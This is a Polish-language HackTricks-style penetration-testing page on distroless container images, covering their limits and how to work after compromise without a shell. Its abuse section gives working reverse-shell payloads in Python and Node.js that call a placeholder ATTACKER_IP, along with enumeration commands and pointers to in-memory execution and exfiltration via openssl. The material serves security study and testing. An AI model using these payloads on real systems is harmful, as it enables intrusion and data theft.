# Kontenery Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Obraz kontenera **distroless** zawiera **minimalny zestaw komponentów runtime wymaganych do uruchomienia jednej konkretnej aplikacji**, celowo pomijając typowe narzędzia dystrybucji, takie jak menedżery pakietów, powłoki i duże zestawy ogólnych narzędzi userland. W praktyce obrazy distroless często zawierają tylko plik binarny aplikacji lub runtime, biblioteki współdzielone, pakiety certyfikatów i bardzo niewielki układ systemu plików. <sup>[[1]](#references)</sup>

Nie chodzi o to, że distroless jest nowym mechanizmem izolacji na poziomie kernela. Distroless to **strategia projektowania obrazu**. Zmienia to, co jest dostępne **wewnątrz** systemu plików kontenera, a nie sposób, w jaki kernel izoluje kontener. To rozróżnienie ma znaczenie, ponieważ distroless wzmacnia środowisko głównie przez ograniczenie narzędzi, których może użyć atakujący po uzyskaniu możliwości wykonywania kodu. Nie zastępuje namespaces, seccomp, capabilities, AppArmor, SELinux ani żadnego innego mechanizmu izolacji runtime.

## Dlaczego powstał Distroless

Obrazy distroless służą przede wszystkim do ograniczenia:

- rozmiaru obrazu
- złożoności operacyjnej obrazu
- liczby pakietów i plików binarnych, które mogą zawierać podatności
- liczby narzędzi post-exploitation dostępnych domyślnie dla atakującego

Dlatego obrazy distroless są popularne w środowiskach produkcyjnych. Kontener, który nie zawiera powłoki, menedżera pakietów ani prawie żadnych ogólnych narzędzi, jest zwykle łatwiejszy w obsłudze i trudniejszy do interaktywnego nadużycia po przejęciu.

Przykłady znanych rodzin obrazów w stylu distroless:

- obrazy distroless Google <sup>[[1]](#references)</sup>
- utwardzone/minimalne obrazy Chainguard <sup>[[2]](#references)</sup>

## Czego nie oznacza Distroless

Kontener distroless **nie jest**:

- automatycznie rootless
- automatycznie nieuprzywilejowany
- automatycznie tylko do odczytu
- automatycznie chroniony przez seccomp, AppArmor lub SELinux
- automatycznie bezpieczny przed ucieczką z kontenera

Nadal można uruchomić obraz distroless z `--privileged`, współdzieleniem host namespaces, niebezpiecznymi bind mountami lub zamontowanym socketem runtime. W takim przypadku obraz może być minimalny, ale kontener nadal może być katastrofalnie niebezpieczny. Distroless zmienia **powierzchnię ataku userland**, a nie **granicę zaufania kernela**.

## Typowe cechy operacyjne

Gdy przejmiesz kontener distroless, zwykle od razu zauważysz, że typowe założenia przestają być prawdziwe. Może nie być `sh`, `bash`, `ls`, `id`, `cat`, a czasami nawet środowiska opartego na libc, które zachowuje się zgodnie z oczekiwaniami wynikającymi z typowych technik. Wpływa to zarówno na offense, jak i defense, ponieważ brak narzędzi zmienia debugowanie, reagowanie na incydenty i post-exploitation.

Najczęstsze wzorce:

- runtime aplikacji jest dostępny, ale niewiele poza nim
- payloady oparte na powłoce nie działają, bo nie ma powłoki
- typowe jednolinijkowe polecenia do enumeracji nie działają, bo brakuje pomocniczych plików binarnych
- często występują też zabezpieczenia systemu plików, takie jak rootfs tylko do odczytu lub `noexec` w zapisywalnych lokalizacjach tmpfs

To właśnie ta kombinacja zwykle sprawia, że mówi się o „weaponizing distroless”.

## Distroless a Post-Exploitation

Głównym wyzwaniem ofensywnym w środowisku distroless nie zawsze jest początkowe RCE. Często problemem jest to, co następuje później. Jeśli przejęty workload umożliwia wykonywanie kodu w runtime języka, takiego jak Python, Node.js, Java lub Go, możesz wykonywać dowolną logikę, ale nie za pomocą typowych przepływów pracy opartych na powłoce, powszechnych na innych systemach Linux.

Oznacza to, że post-exploitation często przybiera jeden z trzech kierunków:

1. **Użyj bezpośrednio istniejącego runtime języka**, aby enumerować środowisko, otwierać sockety, odczytywać pliki lub przygotowywać dodatkowe payloady.
2. **Wczytaj własne narzędzia do pamięci**, jeśli system plików jest tylko do odczytu lub zapisywalne lokalizacje są zamontowane z `noexec`.
3. **Nadużyj istniejących plików binarnych obecnych już w obrazie**, jeśli aplikacja lub jej zależności zawierają coś nieoczekiwanie przydatnego.

## Nadużycia

### Enumeruj Dostępny Runtime

W wielu kontenerach distroless nie ma powłoki, ale nadal dostępny jest runtime aplikacji. Jeśli celem jest usługa Python, dostępny jest Python. Jeśli celem jest Node.js, dostępny jest Node. Często zapewnia to wystarczającą funkcjonalność do enumeracji plików, odczytu zmiennych środowiskowych, otwierania reverse shelli i przygotowywania wykonania w pamięci bez wywoływania `/bin/sh`.

Prosty przykład z Pythonem:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Prosty przykład z Node.js:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Wpływ:

- odzyskanie zmiennych środowiskowych, często obejmujących dane uwierzytelniające lub endpointy usług
- enumeracja systemu plików bez `/bin/ls`
- identyfikacja ścieżek z prawem zapisu i zamontowanych sekretów

### Interaktywne środowisko uruchomieniowe bez `/bin/sh`

Jeśli obraz nie zawiera `sh` ani `bash`, klasyczny reverse shell oparty na powłoce nie zadziała. W takiej sytuacji udostępnij interaktywną sesję w zainstalowanym środowisku uruchomieniowym języka zamiast uruchamiać nieistniejącą powłokę.

Na przykład ten payload w Pythonie przekierowuje interaktywną konsolę Pythona przez gniazdo:

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

Równoważne podejście w Node.js może wykonywać kod JavaScript otrzymany przez socket. To JavaScript REPL, a nie powłoka systemu operacyjnego; operacje na systemie plików, procesach i sieci należy wykonywać za pomocą API Node.js:

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

Oba przykłady wymagają łączności wychodzącej i dostępnego interpretera, a każdy z nich zapewnia tylko funkcjonalność udostępnianą przez ten interpreter.

Jeśli obraz nieoczekiwanie zawiera `/bin/sh`, klasyczne payloady shellowe korzystające z interpretera nadal mogą się przydać. Pokazano je osobno, ponieważ nie są naprawdę pozbawione shella:

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

Starszy wzorzec pętli poleceń w Pythonie jest również przydatny, gdy `/bin/sh` istnieje, ale interaktywny PTY jest niewygodny. Został tu zachowany, a jego rzeczywista zależność została jasno wskazana: `subprocess.run(..., shell=True)` wywołuje powłokę systemową, więc **nie jest** techniką no-shell.

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### Pełny przykład: pętla poleceń Python bez shella

Jeśli obraz zawiera Python, ale nie ma w nim żadnego shella, lokalny REPL Pythona nadal może umożliwić inspekcję systemu plików, środowiska i sieci:

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

Ta pętla nie wywołuje `/bin/sh`. Bezpośrednio interpretuje wyrażenia i instrukcje Pythona, dlatego operacje muszą korzystać z API Pythona, a nie z poleceń powłoki. Mimo tego ograniczenia może zapewnić wiele możliwości typowych dla podstawowej powłoki: enumerowanie systemu plików i zmiennych środowiskowych, dostęp do danych, aktywność sieciową oraz przygotowywanie kolejnych payloadów za pomocą zainstalowanego środowiska uruchomieniowego.

### Uruchamianie narzędzi w pamięci

Obrazy distroless często łączy się z:

- `readOnlyRootFilesystem: true`
- zapisywalnym tmpfs z opcją `noexec`, takim jak `/dev/shm`
- brakiem narzędzi do zarządzania pakietami

Takie połączenie sprawia, że klasyczne metody „pobierz binarny plik na dysk i uruchom go” są zawodne. W takich przypadkach głównym rozwiązaniem stają się techniki uruchamiania w pamięci.

Poświęcona temu strona znajduje się tutaj:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Najistotniejsze opisane tam techniki to:

- `memfd_create` + `execve` za pośrednictwem środowisk uruchomieniowych skryptów <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

W przypadku usługi Python, Node.js lub PHP punktem wejścia może być błąd aplikacji, taki jak template injection, prototype pollution lub niebezpieczna ewaluacja. Jeśli umożliwi on wykonanie kodu wewnątrz procesu, technika `/proc/self/mem` może uruchomić loader bez powłoki ani pliku wykonywalnego na dysku. Nadal oznacza to wykonanie kodu z uprawnieniami procesu kontenera; do ucieczki z kontenera potrzebna jest odrębna podatność środowiska uruchomieniowego lub granicy hosta. Wymagania wstępne opisano w sekcji [techniki read-only/noexec/distroless](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md).

### Istniejące pliki binarne w obrazie

Niektóre obrazy distroless nadal zawierają pliki binarne niezbędne do działania, które mogą okazać się przydatne po przejęciu. Często spotykanym przykładem jest `openssl`, ponieważ aplikacje czasami potrzebują go do zadań związanych z kryptografią lub TLS.

Szybki wzorzec wyszukiwania:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

Jeśli dostępny jest `openssl`, może się przydać do:

- nawiązywania wychodzących połączeń TLS
- eksfiltracji danych przez dozwolony kanał egress
- przygotowywania danych payloadu w zakodowanych/zaszyfrowanych blobach

Dokładny sposób nadużycia zależy od tego, co faktycznie jest zainstalowane, ale ogólna zasada jest taka: distroless nie oznacza „żadnych narzędzi”, lecz „znacznie mniej narzędzi niż w standardowym obrazie dystrybucji”.

## Kontrole

Celem tych kontroli jest ustalenie, czy obraz rzeczywiście jest distroless w praktyce oraz które pliki binarne środowiska uruchomieniowego lub pomocnicze są nadal dostępne na potrzeby post-exploitation.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

Co jest tutaj interesujące:

- Jeśli nie ma `shell`, ale dostępne jest środowisko uruchomieniowe, takie jak Python lub Node, post-exploitation powinno przejść na wykonywanie kodu za pośrednictwem środowiska uruchomieniowego.
- Jeśli główny system plików jest tylko do odczytu, a `/dev/shm` jest zapisywalny, ale ma opcję `noexec`, techniki wykonywania kodu w pamięci stają się znacznie bardziej istotne.
- Jeśli dostępne są narzędzia pomocnicze, takie jak `openssl`, `busybox` lub `java`, mogą zapewnić wystarczającą funkcjonalność, aby uzyskać dalszy dostęp.

## Domyślne ustawienia środowiska uruchomieniowego

| Styl obrazu / platformy | Stan domyślny | Typowe zachowanie | Częste ręczne osłabianie zabezpieczeń |
| --- | --- | --- | --- |
| Obrazy w stylu Google distroless | Z założenia minimalny userspace | Brak `shell`, brak menedżera pakietów, tylko zależności aplikacji/środowiska uruchomieniowego | dodawanie warstw debugujących, sidecarów z `shell`, kopiowanie `busybox` lub narzędzi |
| Minimalne obrazy Chainguard | Z założenia minimalny userspace | Ograniczona powierzchnia pakietów, często obrazy przeznaczone dla jednego środowiska uruchomieniowego lub usługi | używanie wariantów `:latest-dev` lub debugujących, kopiowanie narzędzi podczas budowania |
| Obciążenia Kubernetes korzystające z obrazów distroless | Zależnie od konfiguracji Pod | Distroless dotyczy wyłącznie userspace; poziom zabezpieczeń Poda nadal zależy od specyfikacji Poda i domyślnych ustawień środowiska uruchomieniowego | dodawanie efemerycznych kontenerów debugujących, montowanie zasobów hosta, ustawienia uprzywilejowanego Poda |
| Docker / Podman uruchamiające obrazy distroless | Zależnie od flag uruchomieniowych | Minimalny system plików, ale zabezpieczenia środowiska uruchomieniowego nadal zależą od flag i konfiguracji demona | `--privileged`, współdzielenie przestrzeni nazw hosta, montowanie gniazd środowiska uruchomieniowego, zapisywalne montowania hosta |

Najważniejsze jest to, że distroless to **właściwość obrazu**, a nie ochrona zapewniana przez środowisko uruchomieniowe. Jego wartość wynika z ograniczenia tego, co jest dostępne w systemie plików po przejęciu. Budowanie wieloetapowe to częsty sposób na wykluczenie narzędzi do budowania z obrazu końcowego. <sup>[[3]](#references)</sup>

## Powiązane strony

Informacje o obejściach zabezpieczeń systemu plików i wykonywania kodu w pamięci, często potrzebnych w środowiskach distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Informacje o nadużyciach związanych ze środowiskiem uruchomieniowym kontenerów, gniazdami i montowaniami, które nadal dotyczą obciążeń distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Obrazy kontenerów Distroless](https://github.com/GoogleContainerTools/distroless)
- [2] [Dokumentacja Chainguard Images](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker Docs - Budowanie wieloetapowe](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - strona podręcznika Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
